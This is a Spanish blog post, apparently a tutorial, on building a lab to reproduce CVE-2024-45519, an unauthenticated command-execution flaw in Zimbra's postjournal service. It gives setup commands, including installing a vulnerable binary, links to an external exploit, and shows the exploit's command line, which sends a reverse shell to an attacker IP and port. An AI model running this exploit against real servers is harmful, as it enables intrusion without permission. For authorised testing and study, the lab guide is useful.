---
title: CVE-2024-45519 - Configuración del exploit de Zimbra Postjournal
date: 2024-11-11 09:00:00 
categories: [CIBERSEGURIDAD]
tags: [vulnerabilidad, tools]
description: Permite la ejecución remota de comandos mediante el servicio postjournal
image: /assets/95/preview1.png
---

GitHub: [https://github.com/Chocapikk/CVE-2024-45519](https://github.com/Chocapikk/CVE-2024-45519)

CVE-2024-45519 es una vulnerabilidad en Zimbra Collaboration (ZCS) que permite a usuarios no autenticados ejecutar comandos a través del  postjournal servicio.
Esta guía le muestra cómo configurar un entorno de laboratorio para reproducir el problema y ejecutar el exploit.

#### Versiones afectadas

- Joule : versión 8.8.15
- Kepler : versión 9.0.0
- Narciso : versiones 10.0.x anteriores a 10.0.9
- Narciso : versión 10.1.0

#### Configuración del laboratorio

- Prepara el entorno de prueba

Asegúrate de que estés ejecutando Ubuntu 20.04.6 LTS (Focal Fossa) en tu máquina de laboratorio.
Ejemplo de entorno de prueba: Ubuntu 20.04.6 LTS.

- Descargar Zimbra

Ejecute los siguientes comandos para descargar y extraer el paquete Zimbra Collaboration: 

      sudo su
      wget https://files.zimbra.com/downloads/8.8.15_GA/zcs-NETWORK-8.8.15_GA_4177.UBUNTU20_64.20211112014220.tgz
      tar -xvzf zcs-NETWORK-8.8.15_GA_4177.UBUNTU20_64.20211112014220.tgz
      cd zcs-NETWORK-8.8.15_GA_4177.UBUNTU20_64.20211112014220

- Configurar nombre de host

  Establezca el nombre de host en  zimbra.labo: hostnamectl set-hostname zimbra.labo

- Instalar Zimbra

Siga la guía de instalación aquí   [Guía de instalación de Zimbra](https://zimbra.github.io/installguides/latest/single.html#Installing_Zimbra_Collaboration_Software).
Utilice el repositorio de paquetes de Zimbra cuando se le solicite. Seleccione  Sí  para esa opción.

- Postjournal Reemplazar el binario vulnerable

Elimine el  postjournal proceso en ejecución y reemplace el binario con el vulnerable:

      sudo pkill postjournal dpkg-deb -x packages/zimbra-core_8.8.15.GA.4177.UBUNTU20.64_amd64.deb /tmp/zimbra-core
      sudo cp /tmp/zimbra-core/opt/zimbra/libexec/postjournal /opt/zimbra/libexec/postjournal

- Habilitar y reiniciar los servicios de Zimbra

  Inicie sesión como  zimbra usuario y habilite el  postjournal servicio:

      sudo su - zimbra
      zmlocalconfig -e postjournal_enabled=true
      zmcontrol restart

#### Uso de exploits

Una vez que el laboratorio esté configurado y funcionando, puedes usar el exploit para aprovechar la vulnerabilidad.

- Preparar el exploit
  Asegúrese de que el script de exploit (que suponemos que ya ha preparado) apunte a la dirección IP y al puerto correctos.

- Ejecutar el exploit
  Ejecutar el exploit para atacar la instancia de Zimbra vulnerable. Por ejemplo, usando el script:python exploit.py <target> -lh <attacker-ip> -lp <attacker-port> -p <smtp-port>

- Disfruta de tu shell
- Una vez que el exploit se conecte exitosamente, tendrás ejecución de comando en el servidor Zimbra.

#### Referencias

- [Zimbra CVE-2024-45519 - Cyberveille eSante](https://cyberveille.esante.gouv.fr/alertes/zimbra-cve-2024-45519-2024-10-02)
- [Blog de ejecución remota de código de Zimbra - ProjectDiscovery](https://projectdiscovery.io/blog/zimbra-remote-code-execution)

#### Aviso

Este exploit y esta guía son solo para fines educativos. Utilice esta información de manera responsable y solo en sistemas para los que tenga permiso explícito para probar. La explotación no autorizada de sistemas es ilegal y poco ética. Los autores y colaboradores no son responsables de ningún mal uso o daño causado por esta información.


